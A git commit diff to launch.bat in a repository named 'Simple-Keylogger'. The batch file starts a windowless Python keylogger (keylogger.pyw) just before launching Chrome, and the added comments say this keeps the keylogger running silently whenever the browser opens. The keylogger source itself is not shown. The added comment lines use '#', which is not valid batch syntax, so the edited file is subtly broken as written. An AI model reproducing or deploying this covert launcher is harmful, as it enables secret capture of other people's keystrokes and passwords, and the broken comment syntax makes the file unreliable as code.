fd2499f42d2709aa53fc05216ac9292fefa95388
Keshav Malpani <malpanikeshav95@gmail.com>
2017-04-18 12:49:43 -0500

    Added comments

--- launch.bat
+++ launch.bat
@@ -1,3 +1,7 @@
-@echo off
+@echo off #to make sure that the keylogger runs silently
+
+#Make sure that whenever chrome starts - out python keylogger script starts before that
+
 start "" "C:\Users\Keshav Malpani\Documents\GitHub\Simple-Keylogger\keylogger.pyw"
+
 start "" "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
